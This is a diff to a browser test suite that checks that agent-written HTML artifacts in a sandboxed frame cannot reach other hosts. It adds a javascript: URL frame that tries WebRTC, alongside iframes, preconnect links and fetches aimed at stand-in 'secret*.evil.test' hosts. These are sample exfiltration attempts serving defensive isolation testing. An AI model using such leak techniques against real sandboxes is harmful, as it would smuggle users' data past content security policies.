@@ -1,11 +1,12 @@
 // A plan or artifact an agent wrote can't load anything from another host (HA-266): its frame's policy (FRAME_CSP in
 // src/components/task/htmlFrame.ts) and the board's frame-src (index.html) let it load only its own inline scripts and
-// styles, data: URLs and libraries from the CDNs, and WebRTC is taken away from it (noWebRtc, HA-269). What's counted
-// is connections and UDP packets, not just requests, with hostnames that carry the data mapped to a local server
-// (--host-resolver-rules). Chrome still connects for a frame load the policy refuses, and for a <link rel=preconnect>,
-// unless its "Preload pages" setting is off (HA-269): the checks for what reaches nothing turn it off, and one shows what it does when it's on, as the docs
-// say. A srcdoc frame the page makes itself can still use WebRTC in a browser (not in the desktop app, see
-// electron/preload.cjs): that isn't checked here.
+// styles, data: URLs and libraries from the CDNs, and WebRTC is taken away from it (noWebRtc, HA-269), and from a
+// javascript: URL frame in it (Trusted Types). What's counted is connections and UDP packets, not just requests, with
+// hostnames that carry the data mapped to a local server (--host-resolver-rules). Chrome still connects for a frame
+// load the policy refuses, and for a <link rel=preconnect>, unless its "Preload pages" setting is off (HA-269): the
+// checks for what reaches nothing turn it off, and one shows what it does when it's on, as the docs say. A srcdoc frame
+// the page makes itself can still use WebRTC in a browser (not in the desktop app, see electron/preload.cjs): that
+// isn't checked here.
 import assert from "node:assert/strict";
 import dgram from "node:dgram";
 import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
@@ -86,6 +87,9 @@ const webRtc = (stun, turn) => `
     window.pc = pc;
   } catch {}`;
 
+/** A javascript: URL that tries WebRTC as `webRtc` does, in the new document of the frame it's loaded in. */
+const jsWebRtc = (stun, turn) => `javascript:${encodeURIComponent(`(() => {${webRtc(stun, turn)}})()`)}`;
+
 /** A script that adds a <link rel=preconnect> to `host`.evil.test, on port `port`. */
 const preconnect = (host, port) => `
   const pc = document.createElement("link");
@@ -121,6 +125,11 @@ const leaks = (out, evil, stun) => `
     f.contentWindow.location.href = "https://secret" + i + ".evil.test:${evil}/";
   }
   ${preconnect("secret-pcjs", evil)}
+  // A new document (a javascript: URL's, which frame-src doesn't hold) would have WebRTC again.
+  const js = document.createElement("iframe");
+  js.hidden = true;
+  js.src = "${jsWebRtc(stun, evil)}";
+  document.body.append(js);
   window.rtc = typeof RTCPeerConnection;
   ${webRtc(stun, evil)}
   addEventListener("load", () => {
@@ -131,7 +140,8 @@ const leaks = (out, evil, stun) => `
   });
 </script>
 <iframe src="https://secret-src.evil.test:${evil}/"></iframe>
-<ia-html><template><p>nested</p><img src="${out}/nested-img"><iframe src="https://secret-nested.evil.test:${evil}/"></iframe><link rel="preconnect" href="https://secret-nested-pc.evil.test:${evil}/"><script>
+<iframe hidden src="${jsWebRtc(stun, evil)}"></iframe>
+<ia-html><template><p>nested</p><img src="${out}/nested-img"><iframe src="https://secret-nested.evil.test:${evil}/"></iframe><link rel="preconnect" href="https://secret-nested-pc.evil.test:${evil}/"><iframe hidden src="${jsWebRtc(stun, evil)}"></iframe><script>
   fetch("${out}/nested-fetch").catch(() => {});
   ${preconnect("secret-nested-pcjs", evil)}
   window.rtc = typeof RTCPeerConnection;
@@ -176,7 +186,8 @@ for (const [name, wrap] of [
     const out = `http://127.0.0.1:${outside.address().port}`;
     // The policy's refusals are console errors.
     const browser = await evilBrowser({ preload: false });
-    await withBrowser(server, { browser, allowErrors: [/Content Security Policy|violates|Refused to|Fetch API cannot load|net::ERR_BLOCKED/] }, async (ui) => {
+    const allowErrors = [/Content Security Policy|violates|Refused to|Fetch API cannot load|net::ERR_BLOCKED|requires 'TrustedScript'/];
+    await withBrowser(server, { browser, allowErrors }, async (ui) => {
       const { page } = ui;
       const external = [];
       await page.route(/^https?:\/\//, (route) => {
